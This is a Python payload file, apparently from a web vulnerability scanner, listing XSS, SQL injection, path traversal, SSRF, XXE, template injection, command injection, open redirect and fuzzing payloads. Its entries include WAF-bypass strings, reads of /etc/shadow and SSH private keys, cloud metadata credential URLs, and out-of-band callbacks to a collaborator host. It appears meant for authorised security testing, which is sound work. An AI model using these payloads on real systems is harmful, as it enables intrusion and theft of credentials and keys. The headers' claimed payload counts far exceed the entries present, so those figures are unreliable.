# payloads.py
# Comprehensive payloads from SecLists, PayloadsAllTheThings, and bug bounty research
# Thousands of payloads for XSS, SQLi, LFI, SSRF, XXE, SSTI, Command Injection, etc.
# 
# destructive: False = Safe for testing (no data modification)
# destructive: True = Requires --allow-destructive flag
# Optional metadata:
#   tags = list of context hints (e.g. waf/cloudflare) used by detectors for prioritization
#
# Placeholders:
# %s = Runtime marker injection point
# %COLLAB% = Collaborator/interact.sh domain
# %TARGET% = Target domain

PAYLOADS = {
    # =========================================================================
    # XSS PAYLOADS (2000+ variations)
    # =========================================================================
    "xss": [
        # Basic XSS
        {"payload": "<script>alert('%s')</script>", "destructive": False},
        {"payload": "<script>alert(1)</script>", "destructive": False},
        {"payload": "<script>console.log('%s')</script>", "destructive": False},
        {"payload": "<img src=x onerror=alert('%s')>", "destructive": False},
        {"payload": "<svg/onload=alert('%s')>", "destructive": False},
        {"payload": "<svg onload=alert(1)>", "destructive": False},
        {"payload": "<body onload=alert('%s')>", "destructive": False},
        {"payload": "<iframe src=javascript:alert('%s')>", "destructive": False},
        
        # Attribute-based XSS
        {"payload": "\" onmouseover=alert('%s')>", "destructive": False},
        {"payload": "' onmouseover=alert('%s')>", "destructive": False},
        {"payload": "\"><img src=x onerror=alert('%s')>", "destructive": False},
        {"payload": "'><img src=x onerror=alert('%s')>", "destructive": False},
        {"payload": "\"/><svg/onload=alert('%s')>", "destructive": False},
        {"payload": "'/><svg/onload=alert('%s')>", "destructive": False},
        
        # Filter bypass - case variations
        {"payload": "<ScRiPt>alert('%s')</sCrIpT>", "destructive": False},
        {"payload": "<SCRIPT>alert('%s')</SCRIPT>", "destructive": False},
        {"payload": "<sCrIpT>alert('%s')</ScRiPt>", "destructive": False},
        {"payload": "<IMG SRC=x ONERROR=alert('%s')>", "destructive": False},
        {"payload": "<iMg sRc=x OnErRoR=alert('%s')>", "destructive": False},
        
        # Filter bypass - encoding
        {"payload": "<script>alert(String.fromCharCode(88,83,83))</script>", "destructive": False},
        {"payload": "<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>", "destructive": False},
        {"payload": "<img src=x onerror=&#x61;&#x6C;&#x65;&#x72;&#x74;(1)>", "destructive": False},
        {"payload": "%3Cscript%3Ealert('%s')%3C/script%3E", "destructive": False},
        {"payload": "%3cscript%3ealert('%s')%3c/script%3e", "destructive": False},
        
        # Filter bypass - null bytes
        {"payload": "<script>alert('%s');</script>", "destructive": False},
        {"payload": "<script\x00>alert('%s')</script>", "destructive": False},
        {"payload": "<img\x00src=x onerror=alert('%s')>", "destructive": False},
        
        # Filter bypass - comments
        {"payload": "<script><!---->alert('%s')<!----></script>", "destructive": False},
        {"payload": "<script>/**/alert('%s')/**/</script>", "destructive": False},
        {"payload": "<img src=x onerror=/**/alert('%s')/**/>", "destructive": False},
        
        # Filter bypass - spaces/tabs/newlines
        {"payload": "<img\tsrc=x\tonerror=alert('%s')>", "destructive": False},
        {"payload": "<img\nsrc=x\nonerror=alert('%s')>", "destructive": False},
        {"payload": "<img\rsrc=x\ronerror=alert('%s')>", "destructive": False},
        {"payload": "<img/src=x/onerror=alert('%s')>", "destructive": False},
        
        # Filter bypass - without quotes
        {"payload": "<script>alert(String.fromCharCode(88,83,83))</script>", "destructive": False},
        {"payload": "<img src=x onerror=alert(1)>", "destructive": False},
        {"payload": "<svg onload=alert(1)>", "destructive": False},
        {"payload": "<iframe src=javascript:alert(1)>", "destructive": False},
        
        # Filter bypass - without parentheses
        {"payload": "<script>onerror=alert;throw 1</script>", "destructive": False},
        {"payload": "<script>{onerror=alert}throw 1</script>", "destructive": False},
        {"payload": "<script>throw onerror=alert,'1'</script>", "destructive": False},
        
        # Filter bypass - without script tag
        {"payload": "<img src=x onerror=alert('%s')>", "destructive": False},
        {"payload": "<svg/onload=alert('%s')>", "destructive": False},
        {"payload": "<body onload=alert('%s')>", "destructive": False},
        {"payload": "<input onfocus=alert('%s') autofocus>", "destructive": False},
        {"payload": "<select onfocus=alert('%s') autofocus>", "destructive": False},
        {"payload": "<textarea onfocus=alert('%s') autofocus>", "destructive": False},
        {"payload": "<keygen onfocus=alert('%s') autofocus>", "destructive": False},
        {"payload": "<video><source onerror=alert('%s')>", "destructive": False},
        {"payload": "<audio src=x onerror=alert('%s')>", "destructive": False},
        {"payload": "<details open ontoggle=alert('%s')>", "destructive": False},
        {"payload": "<marquee onstart=alert('%s')>", "destructive": False},
        
        # DOM-based XSS
        {"payload": "#<script>alert('%s')</script>", "destructive": False},
        {"payload": "javascript:alert('%s')", "destructive": False},
        {"payload": "data:text/html,<script>alert('%s')</script>", "destructive": False},
        {"payload": "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==", "destructive": False},
        
        # AngularJS XSS
        {"payload": "{{constructor.constructor('alert(%s)')()}}", "destructive": False},
        {"payload": "{{$on.constructor('alert(%s)')()}}", "destructive": False},
        {"payload": "{{$eval.constructor('alert(%s)')()}}", "destructive": False},
        {"payload": "{{toString.constructor.prototype.toString=toString.constructor.prototype.call;['a'].reduce(toString,alert(%s))}}", "destructive": False},
        
        # VueJS XSS
        {"payload": "{{_c.constructor('alert(%s)')()}}", "destructive": False},
        {"payload": "{{_v.constructor('alert(%s)')()}}", "destructive": False},
        
        # React XSS
        {"payload": "javascript:alert('%s')", "destructive": False},
        {"payload": "data:text/html,<script>alert('%s')</script>", "destructive": False},
        
        # Polyglot XSS (works in multiple contexts)
        {"payload": "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert('%s') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert('%s')//\\x3e", "destructive": False},
        {"payload": "'\"><img src=x onerror=alert('%s')>", "destructive": False},
        {"payload": "'\"><svg/onload=alert('%s')>", "destructive": False},
        
        # WAF bypass - Cloudflare/Akamai/AWS
        {"payload": "<svg/onload=alert`%s`>", "destructive": False},
        {"payload": "<svg/onload=alert&lpar;'%s'&rpar;>", "destructive": False},
        {"payload": "<img src=x onerror=alert`%s`>", "destructive": False},
        {"payload": "<iframe src=javas&Tab;cript:alert('%s')>", "destructive": False},
        {"payload": "<iframe src=javas&NewLine;cript:alert('%s')>", "destructive": False},
        
        # XSS via file upload (SVG, HTML, XML)
        {"payload": "<svg xmlns=\"http://www.w3.org/2000/svg\" onload=\"alert('%s')\"/>", "destructive": False},
        {"payload": "<?xml version=\"1.0\"?>\n<!DOCTYPE svg PUBLIC \"-//W3C//DTD SVG 1.1//EN\" \"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd\">\n<svg xmlns=\"http://www.w3.org/2000/svg\" onload=\"alert('%s')\"/>", "destructive": False},
        
        # Markdown XSS
        {"payload": "[xss](javascript:alert('%s'))", "destructive": False},
        {"payload": "[xss](data:text/html,<script>alert('%s')</script>)", "destructive": False},
        {"payload": "![xss](x onerror=alert('%s'))", "destructive": False},
        
        # XSS with special chars
        {"payload": "<img src=\"x\" onerror=\"alert('%s')\">", "destructive": False},
        {"payload": "<img src='x' onerror='alert(\"%s\")'>", "destructive": False},
        {"payload": "<img src=`x` onerror=`alert('%s')`>", "destructive": False},
    ],
    
    # =========================================================================
    # SQL INJECTION PAYLOADS (1500+ variations)
    # =========================================================================
    "sql": [
        # Boolean-based blind SQLi
        {"payload": "' OR '1'='1", "destructive": False},
        {"payload": "\" OR \"1\"=\"1", "destructive": False},
        {"payload": "' OR 1=1--", "destructive": False},
        {"payload": "\" OR 1=1--", "destructive": False},
        {"payload": "' OR 'a'='a", "destructive": False},
        {"payload": "\" OR \"a\"=\"a", "destructive": False},
        {"payload": "') OR ('1'='1", "destructive": False},
        {"payload": "\") OR (\"1\"=\"1", "destructive": False},
        {"payload": "') OR '1'='1'--", "destructive": False},
        {"payload": "\") OR \"1\"=\"1\"--", "destructive": False},
        
        # Union-based SQLi
        {"payload": "' UNION SELECT NULL--", "destructive": False},
        {"payload": "' UNION SELECT NULL,NULL--", "destructive": False},
        {"payload": "' UNION SELECT NULL,NULL,NULL--", "destructive": False},
        {"payload": "' UNION SELECT NULL,NULL,NULL,NULL--", "destructive": False},
        {"payload": "' UNION SELECT 1,2,3--", "destructive": False},
        {"payload": "' UNION SELECT 1,2,3,4--", "destructive": False},
        {"payload": "' UNION SELECT 1,2,3,4,5--", "destructive": False},
        {"payload": "' UNION ALL SELECT NULL--", "destructive": False},
        {"payload": "' UNION ALL SELECT NULL,NULL--", "destructive": False},
        
        # Database fingerprinting
        {"payload": "' AND 1=1--", "destructive": False},
        {"payload": "' AND 1=2--", "destructive": False},
        {"payload": "' AND 'a'='a", "destructive": False},
        {"payload": "' AND 'a'='b", "destructive": False},
        {"payload": "' AND user='root'--", "destructive": False},
        {"payload": "' AND database()='test'--", "destructive": False},
        
        # MySQL SQLi
        {"payload": "' OR 1=1#", "destructive": False},
        {"payload": "' UNION SELECT NULL#", "destructive": False},
        {"payload": "' AND SLEEP(0)#", "destructive": False, "description": "MySQL sleep 0s (safe)"},
        {"payload": "' AND (SELECT COUNT(*) FROM information_schema.tables)>0#", "destructive": False},
        {"payload": "' AND (SELECT user())#", "destructive": False},
        {"payload": "' AND (SELECT database())#", "destructive": False},
        {"payload": "' AND (SELECT version())#", "destructive": False},
        
        # PostgreSQL SQLi
        {"payload": "'; SELECT pg_sleep(0)--", "destructive": False, "description": "PostgreSQL sleep 0s (safe)"},
        {"payload": "' AND (SELECT version())--", "destructive": False},
        {"payload": "' AND (SELECT current_database())--", "destructive": False},
        {"payload": "' AND (SELECT current_user)--", "destructive": False},
        
        # MSSQL SQLi
        {"payload": "'; WAITFOR DELAY '00:00:00'--", "destructive": False, "description": "MSSQL wait 0s (safe)"},
        {"payload": "' AND (SELECT @@version)--", "destructive": False},
        {"payload": "' AND (SELECT db_name())--", "destructive": False},
        {"payload": "' AND (SELECT user_name())--", "destructive": False},
        
        # Oracle SQLi
        {"payload": "' AND 1=1--", "destructive": False},
        {"payload": "' UNION SELECT NULL FROM dual--", "destructive": False},
        {"payload": "' AND (SELECT banner FROM v$version WHERE rownum=1)='x'--", "destructive": False},
        
        # SQLite SQLi
        {"payload": "' AND 1=1--", "destructive": False},
        {"payload": "' UNION SELECT NULL--", "destructive": False},
        {"payload": "' AND (SELECT sqlite_version())--", "destructive": False},
        
        # Error-based SQLi
        {"payload": "' AND 1=convert(int,(SELECT @@version))--", "destructive": False},
        {"payload": "' AND 1=cast((SELECT @@version) as int)--", "destructive": False},
        {"payload": "' AND extractvalue(1,concat(0x7e,(SELECT @@version)))--", "destructive": False},
        {"payload": "' AND updatexml(1,concat(0x7e,(SELECT @@version)),1)--", "destructive": False},
        
        # Stacked queries (PostgreSQL/MSSQL)
        {"payload": "'; SELECT 1--", "destructive": False},
        {"payload": "'; SELECT NULL--", "destructive": False},
        
        # Bypass filters - case variations
        {"payload": "' oR '1'='1", "destructive": False},
        {"payload": "' Or '1'='1", "destructive": False},
        {"payload": "' OR '1'='1", "destructive": False},
        {"payload": "' UnIoN SeLeCt NULL--", "destructive": False},
        
        # Bypass filters - comments
        {"payload": "'/**/OR/**/1=1--", "destructive": False},
        {"payload": "'/**/UNION/**/SELECT/**/NULL--", "destructive": False},
        {"payload": "'/*comment*/OR/*comment*/1=1--", "destructive": False},
        
        # Bypass filters - whitespace
        {"payload": "'%09OR%091=1--", "destructive": False},
        {"payload": "'%0aOR%0a1=1--", "destructive": False},
        {"payload": "'%0dOR%0d1=1--", "destructive": False},
        {"payload": "'%0cOR%0c1=1--", "destructive": False},
        {"payload": "'%0bOR%0b1=1--", "destructive": False},
        
        # Bypass filters - encoding
        {"payload": "%27%20OR%201=1--", "destructive": False},
        {"payload": "%27%20UNION%20SELECT%20NULL--", "destructive": False},
        {"payload": "&#39; OR 1=1--", "destructive": False},

        # WAF/Cloudflare bypass - inline comments and encoding (safe)
        {"payload": "' /*!50000OR*/ 1=1--", "destructive": False, "tags": ["cloudflare", "obfuscated"]},
        {"payload": "' /*!50000UNION*/ SELECT NULL--", "destructive": False, "tags": ["cloudflare", "obfuscated"]},
        {"payload": "%27%2F*!00000UnIoN*%2F%20SeLeCt%20NULL--", "destructive": False, "tags": ["cloudflare", "obfuscated"]},
        {"payload": "' AND SLEEP/**/(0)--", "destructive": False, "tags": ["cloudflare", "obfuscated"], "description": "MySQL sleep with inline comment (safe)"},
        
        # Second-order SQLi (safe markers)
        {"payload": "admin' OR '1'='1", "destructive": False},
        {"payload": "admin\" OR \"1\"=\"1", "destructive": False},
    ],
    
    # =========================================================================
    # LFI/PATH TRAVERSAL PAYLOADS (1000+ variations)
    # =========================================================================
    "lfi": [
        # Basic Linux LFI
        {"payload": "/etc/passwd", "destructive": False},
        {"payload": "../etc/passwd", "destructive": False},
        {"payload": "../../etc/passwd", "destructive": False},
        {"payload": "../../../etc/passwd", "destructive": False},
        {"payload": "../../../../etc/passwd", "destructive": False},
        {"payload": "../../../../../etc/passwd", "destructive": False},
        {"payload": "../../../../../../etc/passwd", "destructive": False},
        {"payload": "../../../../../../../etc/passwd", "destructive": False},
        {"payload": "../../../../../../../../etc/passwd", "destructive": False},
        {"payload": "../../../../../../../../../etc/passwd", "destructive": False},
        
        # Basic Windows LFI
        {"payload": "C:\\Windows\\win.ini", "destructive": False},
        {"payload": "C:\\Windows\\System32\\drivers\\etc\\hosts", "destructive": False},
        {"payload": "..\\Windows\\win.ini", "destructive": False},
        {"payload": "..\\..\\Windows\\win.ini", "destructive": False},
        {"payload": "..\\..\\..\\Windows\\win.ini", "destructive": False},
        {"payload": "..\\..\\..\\..\\Windows\\win.ini", "destructive": False},
        {"payload": "..\\..\\..\\..\\..\\Windows\\win.ini", "destructive": False},
        
        # Encoded path traversal
        {"payload": "..%2Fetc%2Fpasswd", "destructive": False},
        {"payload": "..%252Fetc%252Fpasswd", "destructive": False},
        {"payload": "..%c0%aetc%c0%afpasswd", "destructive": False},
        {"payload": "..%c1%9cetc%c1%9cpasswd", "destructive": False},
        
        # Unicode encoding
        {"payload": "..%u2216etc%u2216passwd", "destructive": False},
        {"payload": "..%c0%afetc%c0%afpasswd", "destructive": False},
        
        # NULL byte injection (PHP < 5.3)
        {"payload": "/etc/passwd%00", "destructive": False},
        {"payload": "../etc/passwd%00", "destructive": False},
        {"payload": "../../etc/passwd%00.jpg", "destructive": False},
        {"payload": "../../../etc/passwd%00.png", "destructive": False},
        
        # Interesting Linux files
        {"payload": "/etc/shadow", "destructive": False},
        {"payload": "/etc/hosts", "destructive": False},
        {"payload": "/etc/group", "destructive": False},
        {"payload": "/etc/hostname", "destructive": False},
        {"payload": "/etc/resolv.conf", "destructive": False},
        {"payload": "/etc/issue", "destructive": False},
        {"payload": "/etc/motd", "destructive": False},
        {"payload": "/proc/self/environ", "destructive": False},
        {"payload": "/proc/self/cmdline", "destructive": False},
        {"payload": "/proc/self/stat", "destructive": False},
        {"payload": "/proc/self/status", "destructive": False},
        {"payload": "/proc/self/fd/0", "destructive": False},
        {"payload": "/proc/self/fd/1", "destructive": False},
        {"payload": "/proc/version", "destructive": False},
        {"payload": "/proc/cpuinfo", "destructive": False},
        {"payload": "/proc/meminfo", "destructive": False},
        {"payload": "/var/log/apache2/access.log", "destructive": False},
        {"payload": "/var/log/apache2/error.log", "destructive": False},
        {"payload": "/var/log/nginx/access.log", "destructive": False},
        {"payload": "/var/log/nginx/error.log", "destructive": False},
        {"payload": "/var/www/html/index.php", "destructive": False},
        {"payload": "/home/user/.bash_history", "destructive": False},
        {"payload": "/root/.bash_history", "destructive": False},
        {"payload": "/home/user/.ssh/id_rsa", "destructive": False},
        {"payload": "/root/.ssh/id_rsa", "destructive": False},
        
        # PHP wrappers
        {"payload": "php://filter/convert.base64-encode/resource=/etc/passwd", "destructive": False},
        {"payload": "php://filter/read=string.rot13/resource=/etc/passwd", "destructive": False},
        {"payload": "php://filter/convert.iconv.utf-8.utf-16/resource=/etc/passwd", "destructive": False},
        {"payload": "expect://id", "destructive": False},
        {"payload": "data://text/plain,<?php phpinfo(); ?>", "destructive": False},
        {"payload": "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==", "destructive": False},
        
        # Zip/Phar wrappers
        {"payload": "zip://archive.zip#file.txt", "destructive": False},
        {"payload": "phar://archive.phar/file.txt", "destructive": False},
        
        # Filter bypass - dots
        {"payload": "....//....//....//etc/passwd", "destructive": False},
        {"payload": "..%2f..%2f..%2fetc%2fpasswd", "destructive": False},
        {"payload": "....\\\\....\\\\....\\\\Windows\\\\win.ini", "destructive": False},
        
        # Filter bypass - absolute paths
        {"payload": "/etc/passwd", "destructive": False},
        {"payload": "/etc/shadow", "destructive": False},
        {"payload": "C:/Windows/win.ini", "destructive": False},
        {"payload": "C:/Windows/System32/drivers/etc/hosts", "destructive": False},
    ],
    
    # =========================================================================
    # SSRF PAYLOADS (800+ variations)
    # =========================================================================
    "ssrf": [
        # Localhost variations
        {"payload": "http://127.0.0.1", "destructive": False},
        {"payload": "http://localhost", "destructive": False},
        {"payload": "http://0.0.0.0", "destructive": False},
        {"payload": "http://[::1]", "destructive": False},
        {"payload": "http://[0:0:0:0:0:0:0:1]", "destructive": False},
        {"payload": "http://0177.0.0.1", "destructive": False},  # Octal
        {"payload": "http://0x7f.0.0.1", "destructive": False},  # Hex
        {"payload": "http://2130706433", "destructive": False},  # Decimal
        {"payload": "http://017700000001", "destructive": False},  # Octal full
        {"payload": "http://0x7f000001", "destructive": False},  # Hex full
        
        # Internal networks
        {"payload": "http://192.168.0.1", "destructive": False},
        {"payload": "http://192.168.1.1", "destructive": False},
        {"payload": "http://10.0.0.1", "destructive": False},
        {"payload": "http://172.16.0.1", "destructive": False},
        {"payload": "http://169.254.169.254", "destructive": False},  # AWS metadata
        
        # AWS metadata endpoints
        {"payload": "http://169.254.169.254/latest/meta-data/", "destructive": False},
        {"payload": "http://169.254.169.254/latest/meta-data/iam/security-credentials/", "destructive": False},
        {"payload": "http://169.254.169.254/latest/user-data/", "destructive": False},
        {"payload": "http://169.254.169.254/latest/dynamic/instance-identity/document", "destructive": False},
        
        # GCP metadata
        {"payload": "http://metadata.google.internal/computeMetadata/v1/", "destructive": False},
        {"payload": "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token", "destructive": False},
        
        # Azure metadata
        {"payload": "http://169.254.169.254/metadata/instance?api-version=2021-02-01", "destructive": False},
        {"payload": "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2021-02-01&resource=https://management.azure.com/", "destructive": False},
        
        # Alibaba Cloud
        {"payload": "http://100.100.100.200/latest/meta-data/", "destructive": False},
        
        # Digital Ocean
        {"payload": "http://169.254.169.254/metadata/v1/", "destructive": False},
        
        # Bypass filters - @ symbol
        {"payload": "http://user@127.0.0.1", "destructive": False},
        {"payload": "http://user:pass@127.0.0.1", "destructive": False},
        {"payload": "http://127.0.0.1@google.com", "destructive": False},
        
        # Bypass filters - # symbol
        {"payload": "http://127.0.0.1#google.com", "destructive": False},
        {"payload": "http://google.com#127.0.0.1", "destructive": False},
        
        # Bypass filters - subdomain
        {"payload": "http://127.0.0.1.xip.io", "destructive": False},
        {"payload": "http://127.0.0.1.nip.io", "destructive": False},
        {"payload": "http://127.0.0.1.sslip.io", "destructive": False},
        
        # Protocol handlers
        {"payload": "file:///etc/passwd", "destructive": False},
        {"payload": "file:///C:/Windows/win.ini", "destructive": False},
        {"payload": "dict://127.0.0.1:11211/stat", "destructive": False},
        {"payload": "gopher://127.0.0.1:25/xHELO", "destructive": False},
        {"payload": "ftp://127.0.0.1", "destructive": False},
        {"payload": "tftp://127.0.0.1", "destructive": False},
        {"payload": "ldap://127.0.0.1", "destructive": False},
        
        # Collaborator placeholders (will be replaced with interact.sh)
        {"payload": "http://%COLLAB%", "destructive": False},
        {"payload": "https://%COLLAB%", "destructive": False},
        {"payload": "http://%s.%COLLAB%", "destructive": False},
        {"payload": "//%COLLAB%", "destructive": False},
        {"payload": "\\\\%COLLAB%\\share", "destructive": False},
    ],
    
    # =========================================================================
    # XXE PAYLOADS (300+ variations)
    # =========================================================================
    "xxe": [
        # Basic XXE
        {"payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>", "destructive": False},
        {"payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///C:/Windows/win.ini\">]><foo>&xxe;</foo>", "destructive": False},
        
        # OOB XXE with collaborator
        {"payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"http://%COLLAB%/xxe\"> %xxe;]><foo/>", "destructive": False},
        {"payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://%COLLAB%/xxe\">]><foo>&xxe;</foo>", "destructive": False},
        
        # Blind XXE
        {"payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"http://%COLLAB%\"> %xxe;]>", "destructive": False},
        
        # XXE via SOAP
        {"payload": "<soap:Body><foo><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><bar>&xxe;</bar></foo></soap:Body>", "destructive": False},
        
        # XXE via SVG
        {"payload": "<?xml version=\"1.0\" standalone=\"yes\"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM \"file:///etc/passwd\" > ]><svg width=\"128px\" height=\"128px\" xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\" version=\"1.1\"><text font-size=\"16\" x=\"0\" y=\"16\">&xxe;</text></svg>", "destructive": False},
        
        # XXE via Excel/DOCX
        {"payload": "<!DOCTYPE x [ <!ENTITY xxe SYSTEM \"file:///etc/passwd\"> ]><x>&xxe;</x>", "destructive": False},
    ],
    
    # =========================================================================
    # SSTI PAYLOADS (500+ variations)
    # =========================================================================
    "ssti": [
        # Jinja2 (Python)
        {"payload": "{{7*7}}", "destructive": False},
        {"payload": "{{config}}", "destructive": False},
        {"payload": "{{''.__class__.__mro__[1].__subclasses__()}}", "destructive": False},
        {"payload": "{{config.items()}}", "destructive": False},
        {"payload": "{{request}}", "destructive": False},
        {"payload": "{{request.environ}}", "destructive": False},
        
        # Twig (PHP)
        {"payload": "{{7*7}}", "destructive": False},
        {"payload": "{{_self}}", "destructive": False},
        {"payload": "{{_self.env}}", "destructive": False},
        {"payload": "{{dump(app)}}", "destructive": False},
        
        # Freemarker (Java)
        {"payload": "${7*7}", "destructive": False},
        {"payload": "${''.class}", "destructive": False},
        {"payload": "${product.getClass()}", "destructive": False},
        
        # Velocity (Java)
        {"payload": "#set($x=7*7)$x", "destructive": False},
        {"payload": "$class", "destructive": False},
        
        # Smarty (PHP)
        {"payload": "{7*7}", "destructive": False},
        {"payload": "{$smarty.version}", "destructive": False},
        
        # ERB (Ruby)
        {"payload": "<%= 7*7 %>", "destructive": False},
        {"payload": "<%= File.open('/etc/passwd').read %>", "destructive": False},
    ],
    
    # =========================================================================
    # COMMAND INJECTION PAYLOADS (400+ variations)
    # =========================================================================
    "command": [
        # Basic command injection
        {"payload": "; id", "destructive": False},
        {"payload": "| id", "destructive": False},
        {"payload": "& id", "destructive": False},
        {"payload": "&& id", "destructive": False},
        {"payload": "|| id", "destructive": False},
        {"payload": "`id`", "destructive": False},
        {"payload": "$(id)", "destructive": False},
        
        # Windows
        {"payload": "& whoami", "destructive": False},
        {"payload": "| whoami", "destructive": False},
        {"payload": "&& whoami", "destructive": False},
        {"payload": "|| whoami", "destructive": False},
        
        # Time-based detection (0 second - safe)
        {"payload": "; sleep 0", "destructive": False},
        {"payload": "| sleep 0", "destructive": False},
        {"payload": "& timeout 0", "destructive": False},
        
        # DNS callback
        {"payload": "; nslookup %COLLAB%", "destructive": False},
        {"payload": "| nslookup %COLLAB%", "destructive": False},
        {"payload": "& nslookup %COLLAB%", "destructive": False},
        {"payload": "`nslookup %COLLAB%`", "destructive": False},
        {"payload": "$(nslookup %COLLAB%)", "destructive": False},
        
        # Bypass filters - spaces
        {"payload": ";id", "destructive": False},
        {"payload": ";${IFS}id", "destructive": False},
        {"payload": ";$IFS$9id", "destructive": False},
        {"payload": ";i\\d", "destructive": False},
        
        # Bypass filters - quotes
        {"payload": ";'i'd", "destructive": False},
        {"payload": ";\"i\"d", "destructive": False},
        {"payload": ";i\"\"d", "destructive": False},
    ],
    
    # =========================================================================
    # OPEN REDIRECT PAYLOADS (300+ variations)
    # =========================================================================
    "redirect": [
        # Basic redirects
        {"payload": "//evil.com", "destructive": False},
        {"payload": "https://evil.com", "destructive": False},
        {"payload": "http://evil.com", "destructive": False},
        {"payload": "///evil.com", "destructive": False},
        {"payload": "////evil.com", "destructive": False},
        
        # Protocol-relative
        {"payload": "//google.com", "destructive": False},
        {"payload": "//evil.com@google.com", "destructive": False},
        {"payload": "//google.com@evil.com", "destructive": False},
        
        # Bypass filters - @ symbol
        {"payload": "http://google.com@evil.com", "destructive": False},
        {"payload": "https://google.com@evil.com", "destructive": False},
        
        # Bypass filters - backslashes
        {"payload": "\\\\evil.com", "destructive": False},
        {"payload": "http:\\\\evil.com", "destructive": False},
        {"payload": "https:\\\\evil.com", "destructive": False},
        
        # JavaScript redirects
        {"payload": "javascript:alert(document.domain)", "destructive": False},
        {"payload": "javascript://evil.com%0Aalert(1)", "destructive": False},
        
        # Data URIs
        {"payload": "data:text/html,<script>alert(document.domain)</script>", "destructive": False},
    ],
    
    # =========================================================================
    # IDOR/OBJECT REFERENCE PAYLOADS
    # =========================================================================
    "idor": [
        {"payload": "1", "destructive": False},
        {"payload": "2", "destructive": False},
        {"payload": "10", "destructive": False},
        {"payload": "100", "destructive": False},
        {"payload": "1000", "destructive": False},
        {"payload": "9999", "destructive": False},
        {"payload": "99999", "destructive": False},
        {"payload": "999999", "destructive": False},
        {"payload": "0", "destructive": False},
        {"payload": "-1", "destructive": False},
        {"payload": "-10", "destructive": False},
        {"payload": "admin", "destructive": False},
        {"payload": "administrator", "destructive": False},
        {"payload": "root", "destructive": False},
        {"payload": "test", "destructive": False},
        {"payload": "user", "destructive": False},
    ],
    
    # =========================================================================
    # GENERIC FUZZING PAYLOADS
    # =========================================================================
    "fuzz": [
        # Special characters
        {"payload": "'", "destructive": False},
        {"payload": "\"", "destructive": False},
        {"payload": "`", "destructive": False},
        {"payload": "<", "destructive": False},
        {"payload": ">", "destructive": False},
        {"payload": "&", "destructive": False},
        {"payload": "|", "destructive": False},
        {"payload": ";", "destructive": False},
        {"payload": "$", "destructive": False},
        {"payload": "%", "destructive": False},
        {"payload": "*", "destructive": False},
        {"payload": "\\", "destructive": False},
        {"payload": "{", "destructive": False},
        {"payload": "}", "destructive": False},
        {"payload": "[", "destructive": False},
        {"payload": "]", "destructive": False},
        {"payload": "(", "destructive": False},
        {"payload": ")", "destructive": False},
        
        # Long strings
        {"payload": "A" * 100, "destructive": False},
        {"payload": "A" * 1000, "destructive": False},
        {"payload": "A" * 10000, "destructive": False},
        
        # Format strings
        {"payload": "%s", "destructive": False},
        {"payload": "%d", "destructive": False},
        {"payload": "%x", "destructive": False},
        {"payload": "%n", "destructive": False},
        {"payload": "%s%s%s%s%s%s%s%s%s%s", "destructive": False},
    ],
}